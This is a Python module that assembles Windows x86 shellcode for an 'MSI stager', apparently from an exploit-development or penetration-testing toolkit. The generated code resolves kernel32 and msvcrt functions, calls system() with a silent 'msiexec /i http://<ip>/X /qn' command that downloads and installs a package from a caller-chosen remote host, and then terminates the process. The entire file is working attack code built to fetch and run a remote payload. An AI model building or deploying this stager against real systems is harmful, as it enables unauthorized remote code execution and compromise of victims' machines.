"""MSI stager payload builder."""

from shellcode.payload_utils import flatten_asm, format_shellcode_asm
from shellcode.shellcode_helper import ShellcodeHelper


def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0, bad_bytes=None):
    var = ShellcodeHelper(bad_bytes=bad_bytes)

    if rev_port == "80":
        rev_port = ""
    else:
        rev_port = ":" + rev_port

    msi_exec_str = f"msiexec /i http://{rev_ip_addr}{rev_port}/X /qn"

    f_term_process = "TerminateProcess"
    f_system = "system"

    for function_name in (f_term_process, f_system):
        var.add(function_name)

    v_command = "msi_command"
    var.add(v_command, reserve=max(0x20, var.align_dword(len(msi_exec_str) + 1)))

    asm = [
        "start:",
        f"{['', 'int3;'][breakpoint]}",
        var.get_esp_setup(),                    # reserve scratch space for resolver state and command buffer
        var.get_clear_variables(),              # zero the stack-backed variable area
        var.get_common_shellcode(),             # locate kernel32 and bootstrap find_function/LoadLibraryA

        "   resolve_symbols_kernel32: ",        # resolve APIs needed before loading msvcrt
        var.find_function(f_term_process),

        "   load_msvcrt:                         ",  # load msvcrt.dll so system() is available
        var.load_library("msvcrt.dll"),

        "   resolve_symbols_msvcrt:              ",  # resolve system() from the loaded CRT module
        var.find_function(f_system),

        "   create_command_string:               ",  # build a writable command line buffer for system()
        var.set_variable_data(v_command, msi_exec_str),

        "   call_system:                         ",  # system(command)
        var.push_var_address(v_command),
        var.call_function(f_system),

        "   exec_shellcode:                      ",  # terminate once system() returns
        "       xor ecx, ecx                    ;",
        "       push ecx                        ;",
        "       push 0xffffffff                 ;",
        var.call_function(f_term_process),
    ]
    return format_shellcode_asm("\n".join(flatten_asm(asm)))
